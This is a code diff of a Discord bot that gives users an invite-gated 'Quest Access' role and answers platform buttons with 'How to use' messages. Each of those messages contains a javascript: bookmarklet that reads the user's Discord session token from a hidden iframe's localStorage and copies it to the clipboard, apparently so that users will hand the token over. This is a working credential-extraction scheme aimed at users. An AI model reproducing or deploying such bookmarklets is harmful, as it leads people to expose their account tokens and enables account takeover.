@@ -28,28 +28,39 @@ export function makeTokenStore(secret) {
 
 function checkUserAccess(member) {
     if (!member) return true;
-    if (member.permissions.has('Administrator')) return true;
+    
+    try {
+        if (member.permissions && typeof member.permissions.has === 'function') {
+            if (member.permissions.has('Administrator')) return true;
+        }
+    } catch (e) {}
+
+    const userId = member.id || member.author?.id;
+    if (!userId) return false;
 
     const dbPath = path.resolve('./invitesData.json');
     if (fs.existsSync(dbPath)) {
         try {
             const inviteData = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
-            const userInvites = inviteData[member.id]?.count || 0;
-            const targetRole = member.guild.roles.cache.find(r => r.name === 'Quest Access');
-
-            if (userInvites >= 2) {
-                if (targetRole && !member.roles.cache.has(targetRole.id)) {
-                    member.roles.add(targetRole).catch(() => {});
+            const userInvites = inviteData[userId]?.count || 0;
+            
+            if (member.guild && member.roles) {
+                const targetRole = member.guild.roles.cache.find(r => r.name === 'Quest Access');
+                if (userInvites >= 2) {
+                    if (targetRole && !member.roles.cache.has(targetRole.id)) {
+                        member.roles.add(targetRole).catch(() => {});
+                    }
+                    return true;
                 }
-                return true;
+                return member.roles.cache.some(role => role.name === 'Quest Access');
             }
-            // Role removal logic yahan se hata di gayi hai taaki bot kisi ka role automatic remove na kare.
+            if (userInvites >= 2) return true;
         } catch (err) {
             console.error('Database check error:', err);
         }
     }
 
-    return member.roles.cache.some(role => role.name === 'Quest Access');
+    return member.roles?.cache?.some(role => role.name === 'Quest Access') || false;
 }
 
 async function sendAccessDenied(interactionOrMessage, isEphemeral = true) {
@@ -515,45 +526,38 @@ export async function handleLinkPromptButton(interaction) {
     await interaction.showModal(buildLinkModal());
 }
 
-// Platform Buttons Handler (PC, Android, iOS click handler without language tags)
 export async function handlePlatformButton(interaction) {
     const customId = interaction.customId;
     if (customId !== 'btn_pc' && customId !== 'btn_android' && customId !== 'btn_ios') return;
 
-    // 1. PC Platform
     if (customId === 'btn_pc') {
         const pcScript = `javascript:(function(){var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){try{t=JSON.parse(t)}catch(e){}}var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();var n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#1a1a2e;color:#e94560;padding:15px 20px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.5);font-family:Arial,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s;';document.body.appendChild(n);setTimeout(function(){n.style.opacity='1';},50);setTimeout(function(){n.style.opacity='0';setTimeout(function(){n.remove();},500);},3500)}else{alert('No token found. Make sure you are logged into Discord on this browser.');}})();`;
-        
         const pcVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/lv_0_20260821085534.mp4';
 
         await interaction.reply({
-            content: `\`\`\n${pcScript}\n\`\`\n${pcVideo}`,
+            content: `### 📌 How to use\n\`\`\n${pcScript}\n\`\`\n${pcVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
     }
 
-    // 2. Android Platform
     if (customId === 'btn_android') {
         const androidScript = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>n.style.opacity='1',50);setTimeout(()=>n.style.opacity='0',3500);setTimeout(()=>n.remove(),4000);}catch(e){alert('Error copying token');}})();`;
-        
-        const androidVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1541316029718732850/lv_0_20260824110324.mp4?ex=6a8d25e9&is=6a8bd469&hm=7a2d00bbf843271a7af199da483674f24f3f5e21482903574f09f0ab0f6dab02& ';
+        const androidVideo = 'https://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4?ex=6a90641c&is=6a8f129c&hm=7bc7af1c82a00cf864ba23c209b174b031cc95e4ae9851d2b64bd4387fd0f212&';
 
         await interaction.reply({
-            content: `\`\`\n${androidScript}\n\`\`\n${androidVideo}`,
+            content: `### 📌 How to use\n\`\`\n${androidScript}\n\`\`\n${androidVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
     }
 
-    // 3. iOS Platform
     if (customId === 'btn_ios') {
         const iosScript = `javascript:(function(){try{var i=document.createElement('iframe');document.body.appendChild(i);var t=JSON.parse(i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1'));navigator.clipboard.writeText(t).then(function(){var d=document.createElement('div');d.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';Object.assign(d.style,{position:'fixed',top:'10px',left:'10px',background:'#d4edda',color:'#155724',padding:'10px',border:'1px solid #c3e6cb',borderRadius:'5px',zIndex:99999,fontFamily:'sans-serif'});document.body.appendChild(d);setTimeout(()=>d.remove(),3000);});}catch(e){alert('Failed to copy token: '+e);}})();`;
-        
-        const iosVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1541316029718732850/lv_0_20260824110324.mp4?ex=6a8d25e9&is=6a8bd469&hm=7a2d00bbf843271a7af199da483674f24f3f5e21482903574f09f0ab0f6dab02&';
+        const iosVideo = 'https://cdn.discordapp.com/attachments/1539722714036699276/1542207446423048342/lv_0_20260826215752.mp4?ex=6a90641c&is=6a8f129c&hm=7bc7af1c82a00cf864ba23c209b174b031cc95e4ae9851d2b64bd4387fd0f212&';
 
         await interaction.reply({
-            content: `\`\`\n${iosScript}\n\`\`\n${iosVideo}`,
+            content: `### 📌 How to use\n\`\`\n${iosScript}\n\`\`\n${iosVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
